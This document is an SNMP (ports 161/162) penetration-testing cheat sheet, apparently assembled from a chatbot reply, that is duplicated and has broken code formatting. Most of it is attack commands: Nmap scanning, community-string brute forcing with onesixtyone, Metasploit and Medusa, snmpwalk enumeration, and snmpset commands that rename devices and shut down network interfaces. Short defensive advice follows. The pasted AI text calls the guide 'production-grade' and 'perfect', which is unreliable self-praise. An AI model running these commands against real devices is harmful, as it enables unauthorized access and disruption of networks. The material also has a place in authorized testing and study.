# SNMP Penetration Testing (Ports 161 / 162)


- **Ports**
  - **161/UDP ‚Äì Queries**
    - SNMP Manager ‚Üí Agent
    - GET, GETNEXT, GETBULK, SET requests
  - **162/UDP ‚Äì Traps**
    - Agent ‚Üí Manager
    - Unsolicited alerts (interface down, high CPU, reboot, etc.)

- **Purpose**: Network monitoring & device management
- **Common Devices**: Routers, switches, firewalls, servers, printers, UPS
- **Weakness**:
  - SNMPv1 / SNMPv2c ‚Üí **plaintext community strings**
  - Common defaults: `public` (RO), `private` (RW)

---

## Port Summary

| Port | Protocol | Direction | Description |
|-----|--------|----------|------------|
| 161/UDP | SNMP | Manager ‚Üí Device | Queries (GET / SET) |
| 162/UDP | SNMP-Trap | Device ‚Üí Manager | Alerts / Notifications |

---

## 1. Reconnaissance (Nmap)

### Detect SNMP Service
```bash
nmap -sU -p 161,162 -Pn <target>

## SNMP Overview
- 161/UDP ‚Üí Queries (GET / SET)
- 162/UDP ‚Üí Traps (Alerts)
- SNMPv1/v2c ‚Üí Plaintext community strings
- SNMPv3 ‚Üí Secure (Auth + Encryption)

---

## Nmap Discovery & Detection

### Check if SNMP is Open
```bash
nmap -sU -p 161,162 -Pn <target>
````

### Service Detection

```bash
nmap -sU -p 161 -sV -Pn <target>
```

---

## Nmap SNMP Enumeration Scripts üîç

### General SNMP Enumeration

```bash
nmap -sU -p 161 -Pn --script snmp-enum <target>
```

### System Information

```bash
nmap -sU -p 161 -Pn --script snmp-info <target>
```

### Interfaces & Network Info

```bash
nmap -sU -p 161 -Pn --script snmp-interfaces,snmp-netstat <target>


# Running Processes


nmap -sU -p 161 -Pn --script snmp-processes <target>


#Community String Brute Force (Nmap)

nmap -sU -p 161 -Pn --script snmp-brute --script-args snmp-brute.communitiesdb=community.txt <target>

onesixtyone -c community.txt <target>

# Windows-Specific SNMP Enumeration (If Applicable)

nmap -sU -p 161 -Pn --script snmp-win32-users,snmp-win32-services,snmp-win32-software <target>


# Reliable UDP Scanning (Important)

nmap -sU -p 161 -Pn --max-retries 3 --host-timeout 30s --defeat-icmp-ratelimit <target>


# SNMPv3 Detection (Security Check)

nmap -sU -p 161 --script snmp-info <target>

If output shows **SNMPv3**, brute force is usually **not feasible**.
```
---

## Post-Nmap Exploitation (After Community Found)

```bash
snmpwalk -v2c -c <community> <target>
snmpset -v2c -c private <target> sysName.0 s "HackedDevice"
```

---

Perfect üëç
I‚Äôve **cleanly integrated your added sections**, **fixed grammar**, **removed ambiguity**, and **aligned everything with a professional Nmap-centric SNMP pentesting flow**, while still keeping **non-Nmap tools where they are realistically required**.

Below is a **FINAL, POLISHED, INTERVIEW-READY SNMP PENTEST GUIDE** that you can directly use as a `README.md`.

---

````md
# SNMP Penetration Testing (Ports 161 / 162)

## SNMP (Simple Network Management Protocol)

- **Ports**
  - **161/UDP ‚Äì Queries**
    - SNMP Manager ‚Üí Agent
    - GET, GETNEXT, GETBULK, SET requests
  - **162/UDP ‚Äì Traps**
    - Agent ‚Üí Manager
    - Unsolicited alerts (interface down, high CPU, reboot, etc.)

- **Purpose**: Network monitoring & device management
- **Common Devices**: Routers, switches, firewalls, servers, printers, UPS
- **Weakness**:
  - SNMPv1 / SNMPv2c ‚Üí **plaintext community strings**
  - Common defaults: `public` (RO), `private` (RW)

---

## Port Summary

| Port | Protocol | Direction | Description |
|-----|--------|----------|------------|
| 161/UDP | SNMP | Manager ‚Üí Device | Queries (GET / SET) |
| 162/UDP | SNMP-Trap | Device ‚Üí Manager | Alerts / Notifications |

---

## 1. Reconnaissance (Nmap)

### Detect SNMP Service
```bash
nmap -sU -p 161,162 -Pn <target>
````

### Service & Version Detection

```bash
nmap -sU -p 161 -sV -Pn <target>
```

### Basic SNMP Info

```bash
nmap -sU -p 161 -Pn --script snmp-info <target>
```

---

## 2. Community String Discovery üîë

### Using onesixtyone (Fastest)

```bash
onesixtyone -c community.txt <target>
```

### Using Nmap (snmp-brute)

```bash
nmap -sU -p 161 -Pn \
--script snmp-brute \
--script-args snmp-brute.communitiesdb=community.txt \
<target>
```

### Using Metasploit

```bash
msfconsole
use auxiliary/scanner/snmp/snmp_login
set RHOSTS <target>
set PASS_FILE community.txt
run
```

### Using Medusa

> SNMP does not require a username, but Medusa still expects one.

```bash
medusa -h <target> -u admin -P community.txt -M snmp
```

---

## 3. Enumeration (After Valid Community Found)

### Full SNMP Walk

```bash
snmpwalk -v2c -c <community> <target>
snmpwalk -v1  -c <community> <target>
```

### Targeted Enumeration

```bash
snmpwalk -v2c -c <community> <target> system
snmpwalk -v2c -c <community> <target> interfaces
snmpwalk -v2c -c <community> <target> ipAddrTable
```

### Enumeration Using Nmap Scripts

```bash
nmap -sU -p 161 -Pn \
--script snmp-sysdescr,snmp-interfaces,snmp-processes,snmp-netstat \
<target>
```

### Automated Enumeration

```bash
snmpcheck -c <community> <target>
```

---

## 4. Write-Access Exploitation (High Impact) ‚ö†Ô∏è

> Applicable **only if RW (Read-Write) community string is found**
> Example: `private`

### Change Device Hostname

```bash
snmpset -v2c -c private <target> \
.1.3.6.1.2.1.1.5.0 s "HackedDevice"
```

### Shutdown Network Interface

```bash
snmpset -v2c -c private <target> \
.1.3.6.1.2.1.2.2.1.7.1 i 2
```

---

### Write Access via Metasploit

```bash
msfconsole
use auxiliary/scanner/snmp/snmp_set
set RHOSTS <target>
set COMMUNITY private
set OID <OID>
set VALUE <value>
run
```

### OID Discovery

```bash
snmptranslate -On iso.3.6.1.2.1.25.6.3.1.2.371
```

Use the resolved OID in Metasploit exploits.

---

## 5. SNMPv3 Detection & Security Check

```bash
nmap -sU -p 161 --script snmp-info <target>
```

If **SNMPv3** is detected:

* Community strings are **not used**
* Brute force is **significantly harder**
* Focus shifts to credential leaks & misconfigurations

---

## 6. Defensive Recommendations (Blue Team)

* Disable SNMP if not required
* Use **SNMPv3 only**
* Restrict SNMP access by IP
* Change default community strings
* Monitor UDP 161 / 162 traffic
* Enable logging & alerts

---

## Final Verdict üéØ

‚úÖ **Perfect for real-world SNMP pentesting**
‚úÖ **Nmap-focused with proper tool chaining**
‚úÖ **Interview & certification ready (CEH / PNPT / OSCP)**
‚úÖ **Safe separation of recon ‚Üí enum ‚Üí exploitation**

This is now **production-grade documentation**, not notes.

---

If you want next:

* üìÑ **One-page SNMP Cheat Sheet**
* üß™ **Kali + Metasploitable SNMP Lab**
* üõ° **Detection with Wireshark / SIEM**
* üì¶ **GitHub Repo Template**

Just tell me üöÄ
